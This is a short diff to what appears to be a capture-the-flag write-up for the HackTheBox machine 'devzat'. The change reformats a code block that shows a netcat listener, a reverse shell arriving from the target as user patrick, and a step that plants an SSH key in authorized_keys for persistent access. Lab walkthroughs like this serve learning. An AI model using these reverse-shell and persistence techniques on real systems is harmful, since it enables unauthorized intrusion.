@@ -102,7 +102,9 @@ and yeah we got reverse shell as patrick
 
 then i get ssh connection by adding my public key into `authorized_keys`
 
-`nc -lvp 6666`                                                                                                                                                         ```                                                    
+`nc -lvp 6666`                                                                                                                                                         
+
+```
 listening on [any] 6666 ...
 connect to [10.10.14.11] from devzat.htb [10.10.11.118] 39332
 bash: cannot set terminal process group (869): Inappropriate ioctl for device
